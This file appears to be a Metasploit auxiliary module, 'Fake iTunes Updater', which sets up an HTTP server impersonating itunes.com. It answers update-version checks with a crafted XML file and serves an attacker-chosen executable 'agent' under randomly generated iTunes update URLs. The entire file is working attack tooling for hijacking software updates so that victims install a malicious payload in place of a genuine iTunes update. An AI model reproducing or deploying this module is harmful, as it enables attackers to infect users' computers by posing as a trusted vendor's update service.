require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Update
	def initialize
		super(
			'Name'        => 'Fake iTunes Updater',
			'Version'     => '1.0',
			'Description'    => %q{
				This module provides a HTTP service that
			is designed to fake iTunes updates.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE
)

		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 80 ]),
			], self.class)

		@base ={
			'vh' => ['itunes.com'],
			'request' => [{
				'req' => '/version', 
				'type' => 'file', 
				'method' => '', 
				'bin'    => '',
				'string' => "",		    
				'parse' => 1,
				'file' => 'itunes_version.xml'
			},
			{
				'req' => '.exe',
				'type' => 'agent', 
				'method' => '', 
				'bin'    => 1,		    
				'string' => '',
				'parse' => '0',
				'file' => ''
			}
			],
			'options' => {  
				'DATA1'  => { 
					'val' => '"http://itunes.com/#{RndAlpha(RndNum(1))}/itunesupdatei#{RndNum(5)}.exe"',
					'hidden' => 1,
					'dynamic'=>1
				},
				'DATA2'  => { 
					'val' => '"10.#{RndNum(1)}.#{RndNum(1)}"',
					'hidden' => 1,
					'dynamic' =>1
				}
		 	}
		}
	end
end
